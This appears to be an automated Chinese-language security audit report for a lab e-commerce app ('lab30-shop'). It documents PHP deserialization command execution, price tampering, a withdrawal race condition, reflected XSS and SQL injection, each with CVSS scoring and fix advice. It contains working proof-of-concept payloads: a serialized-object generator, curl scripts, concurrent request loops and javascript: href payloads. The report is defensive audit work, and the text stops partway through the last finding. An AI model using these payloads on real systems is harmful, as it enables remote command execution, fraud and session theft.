| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程访问 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造序列化对象 | lab30-shop/app/src/dispatch_job.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 账号及 CSRF token | lab30-shop/app/public/ops/jobs.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 命令在应用进程内执行 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意命令可读取数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 任意命令可修改数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏可用性 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_jobs_deser.py', 'language': 'python', 'script': 'import base64, sys, urllib.parse\n# PHP serialize a DispatchJob with command payload\ncmd = sys.argv[1] if len(sys.argv)>1 else \'id\'\npayload = f\'O:12:"DispatchJob":1:{{s:7:"command";s:{len(cmd)}:"{cmd}";}}\'\nb = base64.b64encode(payload.encode()).decode()\nprint(\'POST /ops/jobs.php csrf=<token> job=\' + urllib.parse.quote(b))\n', 'instructions': '以 operator/admin 登录，获取 CSRF token，将生成的 job 字段 POST 到 /ops/jobs.php，页面中的任务输出会显示命令执行结果。', 'normal_input': 'job = base64(serialize(new DispatchJob())) 默认 printf inventory-ready', 'attack_input': 'job = base64(\'O:12:"DispatchJob":1:{s:7:"command";s:2:"id";}\')', 'expected_result': '页面 / 任务记录 details 中输出 `id` 命令结果（uid/gid），而正常输入仅输出 inventory-ready。'}
````

- 运营任务导入对用户提供的序列化数据执行 unserialize，DispatchJob::__wakeup 中 shell_exec 执行可控命令（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：inconclusive）
  来源 `e0648dc64850419c9b803a96405ebdbb` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：app/public/ops/jobs.php:3 在处理 POST 时读取 $_POST['job']，base64_decode 后直接 unserialize，反序列化过程中 DispatchJob::__wakeup（app/src/dispatch_job.php:4）对 public 属性 $command 执行 shell_exec。该页面仅用 require_user(['operator','admin']) 与 check_csrf 保护，没有任何 class 白名单或序列化签名，因此低权限运营账号可提交构造的序列化对象实现系统命令注入。
  输入：HTTP POST 参数 job（base64 编码的 PHP 序列化字符串）
  传播：$_POST['job'] -> base64_decode -> unserialize -> DispatchJob::__wakeup -> shell_exec($this->command)
  危险操作：shell_exec($this->command) 在 Web 进程上下文执行攻击者控制命令
  保护：require_user 角色校验与 check_csrf 仅限制访问，未限制反序列化类型或属性，不构成对命令执行的有效防护
  前提：['攻击者需持有 operator 或 admin 会话、获取该会话 CSRF token，且请求为 POST']
  修复建议：禁止对用户输入 unserialize；改用 JSON 等无对象实例化格式，或至少使用 allowed_classes 白名单与 HMAC 签名，并将任务执行逻辑改为显式命令白名单。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:46:49.088898+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | jobs.php 是 Web 运营页面入口 | lab30-shop/app/public/ops/jobs.php:1-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造 base64 序列化对象并提交表单 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/dispatch_job.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求 operator/admin 角色但属于低权限运营账号 | lab30-shop/app/public/ops/jobs.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-37 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交请求即可触发，无需其他用户参与 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 命令在 Web 服务进程上下文执行，未显式改变授权边界 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | shell_exec 命令输出完全由攻击者控制，可读取任意数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意系统命令修改文件/数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏服务可用性 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'jobs_deser_rce.http', 'language': 'http', 'script': "POST /ops/jobs.php HTTP/1.1\nHost: target\nCookie: SHOPSESSID=<operator-session>\nContent-Type: application/x-www-form-urlencoded\n\ncsrf=<csrf>&job=<base64(serialize(DispatchJob{command:'id'}))>", 'instructions': '以 operator 账号登录后取 CSRF token，将 serialize(O:11:"DispatchJob":1:{s:7:"command";s:2:"id";}) 的 base64 填入 job 字段提交到 /ops/jobs.php，观察页面 <pre> 输出。', 'normal_input': 'job=<base64 of serialize(new DispatchJob())>', 'attack_input': 'job=base64(O:11:"DispatchJob":1:{s:7:"command";s:6:"whoami";})', 'expected_result': '正常输入输出 printf inventory-ready；攻击输入回显 whoami 执行结果，证明任意命令执行。'}
````


### 台账 `5a1f8b8736b246b9ae6d081c49f50198`

- 订单创建信任客户端提交的 price，登录用户可篡改成交价（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：verified）
  来源 `274a7577a704428189a1fed9e7348781` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/create.php', 'start_line': 2, 'end_line': 7}, {'path': 'lab30-shop/app/public/catalog/detail.php', 'start_line': 3, 'end_line': 3}]
  结论：orders/create.php 第3行从 $_POST['price'] 读单价，仅校验为浮点且 >=0，第5行据此算 total，第7行入库，从未用 products.price 覆盖；登录用户可提交 price=0.01 近乎零价下单并扣库存。
  输入：POST 参数 price（catalog/detail.php 隐藏字段可任意改写）
  传播：$_POST['price'] -> filter_var -> $total=round($price*$quantity,2) -> INSERT orders(unit_price,total)
  危险操作：以攻击者可控价格写入订单金额并扣减库存
  保护：仅 CSRF、数量范围与 stock>=? 条件更新，无服务端价格核对
  前提：['任一登录账号 + 合法 CSRF token']
  修复建议：服务端以 products 表价格计算 total，忽略客户端 price。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:04:57.488349+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 远程 HTTP | lab30-shop/app/public/orders/create.php:2-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 改隐藏字段即可 | lab30-shop/app/public/orders/create.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通登录 | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身提交 | lab30-shop/app/public/orders/create.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用价格逻辑 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 不泄露数据 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 订单金额与库存被改写 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/orders/create.php:6-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'price_tamper_poc.sh', 'language': 'bash', 'script': 'curl -s -c /tmp/c.txt -b /tmp/c.txt -o /dev/null http://TARGET/auth/login.php\nTOKEN=$(curl -s -b /tmp/c.txt -c /tmp/c.txt \'http://TARGET/catalog/detail.php?id=1\' | sed -n \'s/.*name="csrf" value="\\([^"]*\\)".*/\\1/p\' | head -1)\ncurl -s -b /tmp/c.txt -H \'Accept: application/json\' -d "product_id=1&quantity=1&price=0.01&csrf=$TOKEN" http://TARGET/orders/create.php -o /dev/null -D - | grep -i location', 'instructions': '入口 http://TARGET/orders/create.php；登录后取 csrf 提交 price=0.01，对比正常 price=129。', 'normal_input': 'product_id=1&quantity=1&price=129', 'attack_input': 'product_id=1&quantity=1&price=0.01', 'expected_result': '订单 total 为 0.01 而非 129。'}
````

- orders/create.php 信任客户端 price 计算 total 入库导致价格篡改（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：inconclusive）
  来源 `1b24915f25894a0f83c97eaf60044cb5` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/create.php', 'start_line': 1, 'end_line': 7}]
  结论：create.php 第3行读取客户端 $_POST['price'] 到 $price，仅用 FILTER_VALIDATE_FLOAT 及第4行 $price>=0、数量 1-20 校验；第5行 $total=round($price*$quantity,2) 用客户端价格计算总额；第7行 INSERT orders 的 unit_price 与 total 均取客户端值，服务端未从 products 表读取真实价格，可低价下单。
  输入：HTTP POST 参数 price、quantity（与 product_id）
  传播：$_POST['price'] -> FILTER_VALIDATE_FLOAT -> $price -> $total -> INSERT orders.unit_price/total
  危险操作：INSERT INTO orders(...unit_price,total...) 使用客户端价格与总额
  保护：check_csrf 与数量上限存在，但没有任何服务端价格来源或与 $p['price'] 比对
  前提：['登录用户，CSRF token 有效，提交 POST 且 price 为非负浮点']
  修复建议：以 $p 从数据库取出的服务端价格计算 $total 与 unit_price，忽略客户端 price 字段。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:21:41.632597+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP POST 提交订单 | lab30-shop/app/public/orders/create.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 登录后修改 POST 中的 price 字段即可 | lab30-shop/app/public/orders/create.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要登录用户会话提交订单 | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交即可 | lab30-shop/app/public/orders/create.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在用户自身权限内篡改自身订单金额 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 不直接导致读取敏感信息 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 订单金额可被任意压低，破坏订单与金额完整性 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接拒绝服务证据 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'price_manipulation_poc.sh', 'language': 'bash', 'script': '#!/bin/bash\nCOOKIE=$1\nCSRF=$2\ncurl -s -b "$COOKIE" -X POST http://target/orders/create.php \\\n  --data-urlencode \'csrf=\'"$CSRF" \\\n  --data \'product_id=1&quantity=1&price=0.01\' -D -\n', 'instructions': '以已登录会话 cookie 和从页面获取的 csrf token 参数运行；product_id 换成有效商品。观察服务端返回 303 到 /orders/detail.php 并生成 total=0.01 的订单。', 'normal_input': 'product_id=1&quantity=1&price=<真实价格>', 'attack_input': 'product_id=1&quantity=1&price=0.01', 'expected_result': '攻击输入生成订单 total/unit_price=0.01，远低于商品真实价格，证明总额由客户端控制。'}
````

- 下单接口信任客户端 price 计算 total 入库导致价格篡改（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L，验证：inconclusive）
  来源 `733dc9c8593d46018f2df003ba95a7a5` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/create.php', 'start_line': 3, 'end_line': 7}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 2, 'end_line': 6}]
  结论：orders/create.php 第3行从 $_POST 取 price/quantity 仅做 FILTER_VALIDATE_FLOAT/INT，第4行只校验 >=0 和 1-20，第5行以客户端 $price 计算 $total，第6行扣库存后第7行将 $price、$total 原样写入 orders 表，未从 products 表读取真实单价；攻击者可提交任意低价下单，篡改订单金额。
  输入：POST 参数 price、quantity、product_id（需登录用户且通过 CSRF）
  传播：第3行 $price=filter_var($_POST['price'],FILTER_VALIDATE_FLOAT)；第5行 $total=round($price*$quantity,2)；第7行 INSERT unit_price=$price,total=$total
  危险操作：以客户端价格计算总额并写入 orders 表
  保护：仅有 FILTER_VALIDATE_FLOAT 和 $price<0 校验、数量 1-20、CSRF 与登录校验；无服务端价格来源比对
  前提：['已登录用户，持有有效 CSRF token，商品库存充足']
  修复建议：从 products 表读取真实单价作为 $price，仅接受客户端 quantity，服务端计算 total；校验库存与价格范围。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:24:48.890176+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口远程利用 | lab30-shop/app/public/orders/create.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 提交 POST 参数即可 | lab30-shop/app/public/orders/create.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录普通用户 | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行发起 | lab30-shop/app/public/orders/create.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响订单与金额数据 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无读取敏感数据证据 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可任意篡改订单单价与总额 | lab30-shop/app/public/orders/create.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 可低价消耗库存 | lab30-shop/app/public/orders/create.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'price_tamper_poc.txt', 'language': 'text', 'script': 'POST /orders/create.php HTTP/1.1\nHost: target\nContent-Type: application/x-www-form-urlencoded\n\nproduct_id=1&quantity=1&price=0.01&csrf=<valid_token>', 'instructions': '登录后获取 /orders/create 页面中 csrf token，提交 product_id 为真实商品、quantity=1、price=0.01 的 POST，随后访问返回的 /orders/detail.php?id=... 查看 unit_price/total。', 'normal_input': 'product_id=1&quantity=1&price=<页面展示真实价格>&csrf=<token>', 'attack_input': 'product_id=1&quantity=1&price=0.01&csrf=<token>', 'expected_result': '正常价格订单总额等于真实单价；篡改请求成功后订单 unit_price 与 total 为 0.01，远低于商品真实价格。'}
````


### 台账 `494423ddc5fb4859bd074dca9235a8c5`

- 提现先读余额后绝对写回，竞态可超额提现（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：verified）
  来源 `495a8f9891604dc29a41df9e7283e5f4` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/wallet/withdraw.php', 'start_line': 2, 'end_line': 11}]
  结论：withdraw.php 第4-5行读余额判断充足，第6行 usleep 拉长窗口，第7行以 $balance-$amount 绝对写回而非条件扣减，无事务与行锁；并发多笔提现复用同一余额基数可超额提现。
  输入：POST 参数 amount
  传播：SELECT balance -> 判断 -> usleep -> UPDATE users SET balance=?(陈旧值) -> INSERT withdrawals
  危险操作：以陈旧读值覆盖余额并记录提现流水
  保护：仅 CSRF 与金额范围；session_write_close 放大并发；无 FOR UPDATE 或条件更新
  前提：['同一账号并发多笔提现']
  修复建议：事务 + SELECT FOR UPDATE 或条件更新校验 rowCount。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:04:57.489374+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 远程并发 | lab30-shop/app/public/wallet/withdraw.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需在窗口内并发 | lab30-shop/app/public/wallet/withdraw.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录 | lab30-shop/app/public/wallet/withdraw.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 自身请求 | lab30-shop/app/public/wallet/withdraw.php:3-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一账户资金逻辑 | lab30-shop/app/public/wallet/withdraw.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 不泄露数据 | lab30-shop/app/public/wallet/withdraw.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 余额与提现记录被错误改写 | lab30-shop/app/public/wallet/withdraw.php:7-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/wallet/withdraw.php:7-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'withdraw_race_poc.sh', 'language': 'bash', 'script': 'TOKEN=$(curl -s -b /tmp/c.txt -c /tmp/c.txt http://TARGET/wallet/index.php | sed -n \'s/.*name="csrf" value="\\([^"]*\\)".*/\\1/p\' | head -1)\nfor i in $(seq 1 10); do curl -s -b /tmp/c.txt -H \'Accept: application/json\' -d "amount=100&csrf=$TOKEN" http://TARGET/wallet/withdraw.php -o /dev/null & done; wait\ncurl -s -b /tmp/c.txt -H \'Accept: application/json\' http://TARGET/wallet/index.php', 'instructions': '入口 http://TARGET/wallet/withdraw.php；登录后并发提交。', 'normal_input': 'amount=100 单笔串行', 'attack_input': 'amount=100 并发 10 次', 'expected_result': '并发后 withdrawn_total 超过实际余额。'}
````


### 台账 `85e0c4fd0de74f398345de4b20b42898`

- profile.php GET url 未转义写入 href 导致反射型 XSS（CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N，验证：inconclusive）
  来源 `f9292695d3464aaf910f667f1d630e5e` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：profile.php 第2行从 $_GET['url'] 取输入（缺省回退到用户 homepage），第3行拼接 '<a id="profile-link" href="'.$url.'">' 直接 echo 输出，未经 h() 转义。攻击者控制 url 参数即可注入 javascript: 伪协议 href，受害者点击链接时执行脚本，构成反射型 XSS。
  输入：HTTP GET 参数 url
  传播：$_GET['url'] -> $url -> 第3行字符串拼接 echo 到 href 属性
  危险操作：echo '<a id="profile-link" href="'.$url.'">' 未转义输出到 HTML 属性
  保护：bootstrap.php:10 提供了 h() 做 htmlspecialchars，但第3行未对其调用；form_input 对表单值做了 h()，但 href 单独拼接泄露
  前提：['受害者访问 /account/profile.php?url=<payload> 链接并点击页面中的链接']
  修复建议：输出 href 时使用 h($url)，并对协议做白名单校验（仅允许 http/https）。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:21:41.631604+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 参数触发，无需本地访问 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造一条带 url 参数的链接即可 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 未见页面本身对未登录者限制，但需用户点击链接触发 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 受害者需点击恶意链接执行 javascript href | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 脚本在商城同源执行 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取同源会话相关内容 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可在页面内伪造操作 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接破坏服务可用性的证据 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_xss_poc.html', 'language': 'html', 'script': '<!doctype html><a href="http://target/account/profile.php?url=javascript:alert(document.domain)">点击触发 XSS</a>', 'instructions': '把 target 换成商城地址；受害者已登录时打开该链接并点击“访问个人主页”。也可直接访问 /account/profile.php?url=javascript:alert(document.domain) 后点击生成的链接。', 'normal_input': '/account/profile.php?url=https://example.com/', 'attack_input': '/account/profile.php?url=javascript:alert(document.domain)', 'expected_result': '正常输入生成 https 链接；攻击输入生成 href="javascript:alert(document.domain)" 的链接，点击执行脚本。'}
````

- 个人主页预览 URL 未转义写入 href 导致反射型 XSS（CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N，验证：inconclusive）
  来源 `fe5cfdb8ba0a4d768ebecad872fde38c` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 46, 'end_line': 46}]
  结论：profile.php 从 $_GET['url'] 读取用户可控值，未做 HTML 属性转义即拼入 <a href="...">，攻击者可构造 javascript: 等 payload 触发脚本执行；bootstrap.php 提供了 h()（htmlspecialchars ENT_QUOTES）但此处未使用，仅 form_input 回显使用了转义。
  输入：GET 参数 url（未登录也可由 !$u? 实际需登录，见第2行 require_user）
  传播：第2行 $url=(string)($_GET['url']??$u['homepage'])，第3行直接 echo '<a id="profile-link" href="'.$url.'">'
  危险操作：未转义字符串拼入 HTML href 属性输出到响应
  保护：未调用 h()；form_input 对回显值转义但不覆盖 href 输出
  前提：['需登录用户访问 profile.php；攻击链接诱导已登录用户点击']
  修复建议：输出 href 前调用 h($url)，并使用 allowlist 校验仅允许 http/https 绝对 URL 或相对路径。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:24:48.888952+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过网页 URL 投递 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 GET 参数即可 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 攻击者无需账户，仅受害用户需登录 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击链接 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于用户浏览器上下文 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取页面上下文 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可篡改页面展示 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无持久破坏证据 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_xss_poc.txt', 'language': 'text', 'script': 'GET /account/profile.php?url=javascript:alert(document.cookie) HTTP/1.1\nHost: target', 'instructions': '以已登录会话在浏览器打开目标地址 /account/profile.php?url=javascript:alert(1)，或构造钓鱼链接诱导已登录用户访问，观察 href 中未转义的 javascript: 是否生效。', 'normal_input': 'url=https://example.com', 'attack_input': 'url=javascript:alert(document.cookie)', 'expected_result': '正常输入输出安全的 https 链接；攻击输入在 href 中保留 javascript: 协议，点击 profile-link 即执行脚本。'}
````


### 台账 `a61dde40538748f4829bb7ba5bb0d43c`

- 会员查询 member_lookup 将 GET 参数 q 拼接进 SQL 导致注入（CVSS 3.1 Base 4.9 (medium) · CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N，验证：verified）
  来源 `bbe3684dc23940c9a6263455b2f2e73c` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：member_lookup() 以字符串拼接构造 LIKE 查询；ops/members.php 把 $_GET['q'] 直接传入，无 prepare/绑定也无转义，运营/管理员账号可通过 q 注入任意 SQL 读取 users 表（含 password_md5）。
  输入：GET 参数 q（/ops/members.php?q=...）
  传播：$_GET['q'] -> member_lookup($term) -> db()->query 字符串拼接
  危险操作：db()->query("SELECT id,username,email,role FROM users WHERE username LIKE '%" . $term . "%'")
  保护：仅 require_user(['operator','admin']) 权限门；查询内部无预处理或转义
  前提：['攻击者持有 operator 或 admin 角色账号']
  修复建议：使用预处理：$q = db()->prepare('SELECT id,username,email,role FROM users WHERE username LIKE ?'); $q->execute(['%' . $term . '%']);

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
